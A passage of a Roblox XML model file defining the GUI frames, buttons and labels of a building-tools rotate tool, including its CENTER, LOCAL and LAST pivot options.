										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
						</Item>
						<Item class="Frame" referent="RBXDFA1C0095B7D4663BF896236BEC1FA0B">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4288914085</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">0</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">true</bool>
								<string name="Name">BTRotateToolGUI</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>280</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>245</XO>
									<YS>0</YS>
									<YO>90</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="Frame" referent="RBX0C97FB61FE1C4FEA98B642D3DD2CD624">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">PivotOption</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBXFFF18562885E4D2AA49B639A208903AC">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Center</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>50</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>70</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX30C126F5E74646F1B5833DB58A3D9FF0">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>6</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-5</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextButton" referent="RBX26BBB1B5124B4C27AC784AE091FA026C">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">true</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">Button</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">1</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBXDCF56182EC004532BF5ADC52B963FC4A">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127774197</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextLabel" referent="RBXCB47F60467F543429530694F252F4BA4">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<string name="Name">Label</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">CENTER</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX1E40CF4DF83349E39A53C3283A0C1EA5">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Local</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>115</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>70</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBXFB94375548874939A288AF3E6399D90B">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>6</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-5</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextButton" referent="RBX38663B22E37440D7831BE8822F1490DF">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">true</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">Button</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">1</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBXCA6944A60CEE463E867C7B0C68BB890C">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextLabel" referent="RBXF8C702FB4669471EBE69EB13D134D00C">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<string name="Name">Label</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">LOCAL</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBXFD2F1E2C089E4708A007CF799A8EBA24">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Last</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>180</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>70</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX3F0D997E27184667B597E57DDEE2377E">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>6</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-5</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextButton" referent="RBX1D6F20EF2C894067820E6F23895CA4CF">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">true</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">Button</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">1</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBX7F9954E19F4B41E0A4B79FFBB2EC42ED">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextLabel" referent="RBXFA48A7AEBCDB4BB2BDA5163B180EA2EE">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<string name="Name">Label</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">LAST</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX60F18946949642F68AD506D0C5F7EA26">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>50</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBXF74314821F134CC68FB4F104F5CEDC50">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<string name="Name">TextLabel</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">Pivot</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">0</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">true</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBXB2E373D880964AADBC9AB8FB9ACE717A">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Title</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX0A1875DA835A466E8AA719216EA1125D">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4283144011</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
